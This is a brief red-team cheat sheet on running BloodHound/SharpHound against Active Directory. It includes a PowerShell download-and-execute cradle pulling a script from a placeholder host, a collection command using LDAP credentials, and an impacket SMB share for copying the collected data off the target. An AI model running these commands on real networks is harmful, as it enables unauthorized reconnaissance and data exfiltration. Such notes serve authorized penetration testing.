# BloodHound
## Upload sharphound
`iex(new-object net.webclient).downloadstring("http://<ip>:<port>/SharpHound.ps1")`

## Collect Data
`invoke-bloodhound -collectionmethod all -domain <domain> -ldapuser <user> -ldappass <password>`

## Transfer Back
On Host: `smbserver.py share . -smb2support -username df -password df`
On Target: `net use \\<ip>\share /u:df df`
`copy *.zip \\<ip>\share*`

## Installation
- install from apt
- `neo4j console`
- neo4j:neo4j
- close window, leave service running
- `bloodhound`


